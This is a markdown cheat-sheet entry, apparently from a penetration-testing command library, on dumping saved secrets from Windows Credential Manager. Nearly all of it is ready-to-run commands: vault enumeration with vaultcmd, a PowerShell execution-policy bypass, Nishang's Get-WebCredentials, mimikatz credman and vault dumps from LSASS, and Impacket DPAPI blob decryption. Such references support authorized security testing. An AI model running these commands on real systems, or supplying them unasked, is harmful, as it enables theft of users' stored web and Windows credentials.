---
technique: WindowsCredentialManager
category: credential-dumping
targets: Credential Manager, Vault, Web Credentials
protocols: DPAPI
remote_capable: false
tags: credential-dumping credman vault dpapi windows web-credentials ad
---

# WindowsCredentialManager

Windows Credential Manager stores web, Windows, generic, and certificate-backed credentials in DPAPI-protected vaults. Native tooling can enumerate vault contents, while PowerShell and mimikatz can recover usable secrets when run in the right user context.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| User context | Best results come from the user session that owns the vault |
| DPAPI material | Cleartext recovery depends on live session keys, masterkeys, or the domain backup key |
| Local access | Credential Manager dumping is a local host technique |

## Windows

### vaultcmd list vaults

#cmd #native #credman

List Credential Manager vaults available to the current user.

```cmd title:"List Credential Manager vaults"
vaultcmd /list
```
<!-- cheat -->

### vaultcmd list properties

#cmd #native #credman

List properties for a specific Credential Manager vault.

```cmd title:"List Credential Manager vault properties"
vaultcmd /listproperties:"$vault_name"
```
<!-- cheat
var vault_name
-->

### vaultcmd list credentials

#cmd #native #credman

List credential entries stored in a specific Credential Manager vault.

```cmd title:"List Credential Manager vault credentials"
vaultcmd /listcreds:"$vault_name"
```
<!-- cheat
var vault_name
-->

### Step 1: Bypass PowerShell execution policy

#powershell #nishang #credman

Start PowerShell with execution policy bypass before importing Get-WebCredentials.

```powershell title:"Start PowerShell with execution policy bypass"
powershell.exe -ExecutionPolicy Bypass
```
<!-- cheat -->

### Step 2: Import Get-WebCredentials

#powershell #nishang #credman

Import Nishang's Get-WebCredentials script in the current PowerShell session.

```powershell title:"Import Get-WebCredentials script"
Import-Module C:\Get-WebCredentials.ps1
```
<!-- cheat -->

### Step 3: Dump web credentials

#powershell #nishang #credman

Dump web credentials from Credential Manager with Get-WebCredentials.

```powershell title:"Dump web credentials with Get-WebCredentials"
Get-WebCredentials
```
<!-- cheat -->

### mimikatz credman

#cmd #mimikatz #credman

Dump Credential Manager entries from LSASS with mimikatz.

```cmd title:"Dump Credential Manager entries with mimikatz"
sekurlsa::credman
```
<!-- cheat -->

### mimikatz vault credentials

#cmd #mimikatz #vault

Dump saved Vault credentials with mimikatz.

```cmd title:"Dump Vault saved credentials with mimikatz"
vault::cred
```
<!-- cheat -->

## Linux

### dpapi.py credential blob

#python #impacket #dpapi #offline

Decrypt an offline Credential Manager blob with a recovered DPAPI masterkey.

```sh title:"Decrypt Credential Manager blob with Impacket dpapi"
dpapi.py credential -file "$credential_file" -key "$masterkey"
```
<!-- cheat
var credential_file
var masterkey
-->
